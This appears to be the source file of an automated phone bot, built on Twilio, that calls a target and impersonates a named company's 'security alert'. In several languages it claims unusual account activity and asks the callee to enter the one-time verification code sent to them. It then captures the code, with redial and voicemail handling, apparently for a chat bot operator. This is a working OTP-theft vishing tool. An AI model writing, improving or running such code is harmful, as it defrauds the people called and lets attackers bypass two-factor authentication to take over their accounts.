import os
import threading
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather

TWILIO_ACCOUNT_SID = os.environ.get("TWILIO_ACCOUNT_SID", "")
TWILIO_AUTH_TOKEN  = os.environ.get("TWILIO_AUTH_TOKEN", "")
TWILIO_PHONE       = os.environ.get("TWILIO_PHONE_NUMBER", "")

_active_calls = {}
_lock = threading.Lock()


def get_twilio_client():
    if not TWILIO_ACCOUNT_SID or not TWILIO_AUTH_TOKEN:
        raise ValueError("Twilio credentials not configured. Set TWILIO_ACCOUNT_SID and TWILIO_AUTH_TOKEN.")
    return Client(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN)


def get_webhook_base() -> str:
    domains = os.environ.get("REPLIT_DOMAINS", "")
    dev_domain = os.environ.get("REPLIT_DEV_DOMAIN", "")
    if domains:
        domain = domains.split(",")[0].strip()
    elif dev_domain:
        domain = dev_domain
    else:
        domain = "localhost:8080"
    if not domain.startswith("http"):
        return f"https://{domain}"
    return domain


def store_call_data(call_sid: str, data: dict):
    with _lock:
        _active_calls[call_sid] = data


def get_call_data(call_sid: str) -> dict:
    with _lock:
        return _active_calls.get(call_sid, {})


def clear_call_data(call_sid: str):
    with _lock:
        _active_calls.pop(call_sid, None)


def store_pending_call(chat_id: str, user_id: str, name: str, company: str,
                       otp_digits: int, lang: str, phone: str) -> str:
    import uuid
    token = uuid.uuid4().hex[:12]
    with _lock:
        _active_calls[f"pending_{token}"] = {
            "chat_id": chat_id,
            "user_id": user_id,
            "name": name,
            "company": company,
            "otp_digits": otp_digits,
            "lang": lang,
            "phone": phone,
        }
    return token


def get_pending_call(token: str) -> dict:
    with _lock:
        return _active_calls.get(f"pending_{token}", {})


def initiate_call(phone: str, chat_id: str, user_id: str, name: str,
                  company: str, otp_digits: int = 6, lang: str = "en") -> dict:
    client = get_twilio_client()
    base = get_webhook_base()

    token = store_pending_call(
        chat_id=str(chat_id),
        user_id=str(user_id),
        name=name,
        company=company,
        otp_digits=otp_digits,
        lang=lang,
        phone=phone,
    )

    voice_url    = f"{base}/voice/otp?token={token}"
    status_url   = f"{base}/voice/status?token={token}"

    call = client.calls.create(
        to=phone,
        from_=TWILIO_PHONE,
        url=voice_url,
        status_callback=status_url,
        status_callback_event=["initiated", "ringing", "answered", "completed"],
        status_callback_method="POST",
        machine_detection="DetectMessageEnd",
        machine_detection_timeout=8,
        async_amd=True,
        async_amd_status_callback=f"{base}/voice/amd?token={token}",
        async_amd_status_callback_method="POST",
    )

    store_call_data(call.sid, {
        "chat_id": str(chat_id),
        "user_id": str(user_id),
        "name": name,
        "company": company,
        "otp_digits": otp_digits,
        "lang": lang,
        "phone": phone,
        "token": token,
    })

    return {"sid": call.sid, "status": call.status, "token": token}


def get_call_status(call_sid: str) -> dict:
    client = get_twilio_client()
    call = client.calls(call_sid).fetch()
    return {
        "sid": call.sid,
        "status": call.status,
        "duration": call.duration,
        "direction": call.direction,
        "from_": call.from_formatted,
        "to": call.to_formatted,
    }


def hangup_call(call_sid: str) -> bool:
    try:
        client = get_twilio_client()
        client.calls(call_sid).update(status="completed")
        return True
    except Exception:
        return False


def redial_call(call_sid: str, chat_id: str, user_id: str, name: str,
                company: str, otp_digits: int = 6, lang: str = "en") -> dict:
    data = get_call_data(call_sid)
    phone = data.get("phone", "")
    if not phone:
        raise ValueError("Original call data not found. Cannot redial.")
    return initiate_call(phone, chat_id, user_id, name, company, otp_digits, lang)


LANGUAGES = {
    "en": "English",
    "hi": "Hindi",
    "es": "Spanish",
    "fr": "French",
    "de": "German",
    "pt": "Portuguese",
    "ar": "Arabic",
}

VOICE_MAP = {
    "en": ("alice", "en-US"),
    "hi": ("Polly.Aditi", "hi-IN"),
    "es": ("alice", "es-ES"),
    "fr": ("alice", "fr-FR"),
    "de": ("alice", "de-DE"),
    "pt": ("alice", "pt-BR"),
    "ar": ("alice", "ar"),
}


def build_voice_twiml_main(token: str, base: str, data: dict) -> str:
    name      = data.get("name", "Customer")
    company   = data.get("company", "Our Company")
    lang      = data.get("lang", "en")
    chat_id   = data.get("chat_id", "")
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    scripts = {
        "en": {
            "human_check": f"Hello, this is a security alert from {company}. "
                           f"This call is for {name}. "
                           f"If you are {name}, please press 1 now to continue.",
            "explain":     f"We have detected unusual activity on your {company} account. "
                           f"For your security, we need to verify your identity.",
            "ask_digits":  "Please enter your one-time verification code now, followed by the pound key.",
        },
        "hi": {
            "human_check": f"नमस्ते, यह {company} से एक सुरक्षा सतर्कता है। "
                           f"यह कॉल {name} के लिए है। "
                           f"यदि आप {name} हैं, तो कृपया जारी रखने के लिए 1 दबाएं।",
            "explain":     f"हमने आपके {company} खाते पर असामान्य गतिविधि का पता लगाया है। "
                           f"आपकी सुरक्षा के लिए, हमें आपकी पहचान सत्यापित करनी होगी।",
            "ask_digits":  "कृपया अभी अपना एकमुश्त सत्यापन कोड दर्ज करें, उसके बाद पाउंड की दबाएं।",
        },
        "es": {
            "human_check": f"Hola, esta es una alerta de seguridad de {company}. "
                           f"Esta llamada es para {name}. "
                           f"Si usted es {name}, por favor presione 1 para continuar.",
            "explain":     f"Hemos detectado actividad inusual en su cuenta de {company}. "
                           f"Por su seguridad, necesitamos verificar su identidad.",
            "ask_digits":  "Por favor ingrese su código de verificación de un solo uso ahora, seguido de la tecla almohadilla.",
        },
        "fr": {
            "human_check": f"Bonjour, ceci est une alerte de sécurité de {company}. "
                           f"Cet appel est pour {name}. "
                           f"Si vous êtes {name}, veuillez appuyer sur 1 pour continuer.",
            "explain":     f"Nous avons détecté une activité inhabituelle sur votre compte {company}. "
                           f"Pour votre sécurité, nous devons vérifier votre identité.",
            "ask_digits":  "Veuillez entrer votre code de vérification à usage unique maintenant, suivi de la touche dièse.",
        },
        "de": {
            "human_check": f"Hallo, dies ist eine Sicherheitswarnung von {company}. "
                           f"Dieser Anruf ist für {name}. "
                           f"Wenn Sie {name} sind, drücken Sie bitte 1, um fortzufahren.",
            "explain":     f"Wir haben ungewöhnliche Aktivitäten auf Ihrem {company}-Konto festgestellt. "
                           f"Zu Ihrer Sicherheit müssen wir Ihre Identität überprüfen.",
            "ask_digits":  "Bitte geben Sie jetzt Ihren Einmal-Verifizierungscode ein, gefolgt von der Rautetaste.",
        },
        "pt": {
            "human_check": f"Olá, este é um alerta de segurança da {company}. "
                           f"Esta ligação é para {name}. "
                           f"Se você é {name}, por favor pressione 1 para continuar.",
            "explain":     f"Detectamos atividade incomum em sua conta {company}. "
                           f"Para sua segurança, precisamos verificar sua identidade.",
            "ask_digits":  "Por favor, insira seu código de verificação único agora, seguido da tecla cerquilha.",
        },
    }

    script = scripts.get(lang, scripts["en"])
    resp = VoiceResponse()
    resp.pause(length=1)

    gather = Gather(
        num_digits=1,
        action=f"{base}/voice/gather?token={token}",
        method="POST",
        timeout=15,
        finish_on_key="#",
    )
    gather.say(script["human_check"], voice=voice, language=language)
    resp.append(gather)
    resp.say("We did not receive a response. Goodbye.", voice="alice")
    resp.hangup()
    return str(resp)


def build_voice_twiml_gather(token: str, base: str, data: dict, digit: str) -> str:
    lang  = data.get("lang", "en")
    otp_digits = int(data.get("otp_digits", 6))
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))

    scripts = {
        "en": {
            "explain":    "We have detected unusual activity on your account. "
                          "To secure your account, please enter the verification code sent to your registered number.",
            "ask_digits": f"Please enter your {otp_digits}-digit code now, followed by the pound key.",
            "invalid":    "Sorry, that is not a valid option. Please try again.",
        },
        "hi": {
            "explain":    "हमने आपके खाते पर असामान्य गतिविधि का पता लगाया है। "
                          "अपने खाते को सुरक्षित करने के लिए, कृपया अपने पंजीकृत नंबर पर भेजा गया सत्यापन कोड दर्ज करें।",
            "ask_digits": f"कृपया अभी अपना {otp_digits} अंकों का कोड दर्ज करें, उसके बाद पाउंड की दबाएं।",
            "invalid":    "क्षमा करें, यह एक मान्य विकल्प नहीं है। कृपया पुनः प्रयास करें।",
        },
        "es": {
            "explain":    "Hemos detectado actividad inusual en su cuenta. "
                          "Para asegurar su cuenta, por favor ingrese el código de verificación enviado a su número registrado.",
            "ask_digits": f"Por favor ingrese su código de {otp_digits} dígitos ahora, seguido de la tecla almohadilla.",
            "invalid":    "Lo sentimos, esa no es una opción válida. Por favor intente de nuevo.",
        },
        "fr": {
            "explain":    "Nous avons détecté une activité inhabituelle sur votre compte. "
                          "Pour sécuriser votre compte, veuillez entrer le code de vérification envoyé à votre numéro enregistré.",
            "ask_digits": f"Veuillez entrer votre code à {otp_digits} chiffres maintenant, suivi de la touche dièse.",
            "invalid":    "Désolé, ce n'est pas une option valide. Veuillez réessayer.",
        },
        "de": {
            "explain":    "Wir haben ungewöhnliche Aktivitäten auf Ihrem Konto festgestellt. "
                          "Um Ihr Konto zu sichern, geben Sie bitte den Verifizierungscode ein, der an Ihre registrierte Nummer gesendet wurde.",
            "ask_digits": f"Bitte geben Sie jetzt Ihren {otp_digits}-stelligen Code ein, gefolgt von der Rautetaste.",
            "invalid":    "Entschuldigung, das ist keine gültige Option. Bitte versuchen Sie es erneut.",
        },
        "pt": {
            "explain":    "Detectamos atividade incomum em sua conta. "
                          "Para proteger sua conta, insira o código de verificação enviado para seu número cadastrado.",
            "ask_digits": f"Por favor insira seu código de {otp_digits} dígitos agora, seguido da tecla cerquilha.",
            "invalid":    "Desculpe, essa não é uma opção válida. Por favor tente novamente.",
        },
    }

    script = scripts.get(lang, scripts["en"])
    resp = VoiceResponse()

    if digit == "1":
        resp.say(script["explain"], voice=voice, language=language)
        resp.pause(length=1)
        gather = Gather(
            num_digits=otp_digits,
            action=f"{base}/voice/gatherotp?token={token}",
            method="POST",
            timeout=20,
            finish_on_key="#",
        )
        gather.say(script["ask_digits"], voice=voice, language=language)
        resp.append(gather)
        resp.say("We did not receive your code. Goodbye.", voice="alice")
        resp.hangup()
    else:
        resp.say(script["invalid"], voice=voice, language=language)
        resp.pause(length=1)
        resp.redirect(f"{base}/voice/otp?token={token}", method="POST")

    return str(resp)


def build_voice_twiml_otp_captured(otp: str, lang: str) -> str:
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))
    thanks = {
        "en": "Thank you. Your verification code has been received. Have a great day. Goodbye.",
        "hi": "धन्यवाद। आपका सत्यापन कोड प्राप्त हो गया है। आपका दिन शुभ हो।",
        "es": "Gracias. Su código de verificación ha sido recibido. Que tenga un buen día. Adiós.",
        "fr": "Merci. Votre code de vérification a été reçu. Bonne journée. Au revoir.",
        "de": "Danke. Ihr Verifizierungscode wurde empfangen. Haben Sie einen schönen Tag. Auf Wiederhören.",
        "pt": "Obrigado. Seu código de verificação foi recebido. Tenha um ótimo dia. Adeus.",
    }
    resp = VoiceResponse()
    resp.say(thanks.get(lang, thanks["en"]), voice=voice, language=language)
    resp.pause(length=1)
    resp.hangup()
    return str(resp)


def build_voice_twiml_voicemail(lang: str) -> str:
    voice, language = VOICE_MAP.get(lang, ("alice", "en-US"))
    msgs = {
        "en": "Hello, this is an important security message. Please call us back at your earliest convenience. Thank you.",
        "hi": "नमस्ते, यह एक महत्वपूर्ण सुरक्षा संदेश है। कृपया जल्द से जल्द हमें वापस कॉल करें। धन्यवाद।",
        "es": "Hola, este es un mensaje de seguridad importante. Por favor llámenos de vuelta lo antes posible. Gracias.",
    }
    resp = VoiceResponse()
    resp.say(msgs.get(lang, msgs["en"]), voice=voice, language=language)
    resp.hangup()
    return str(resp)
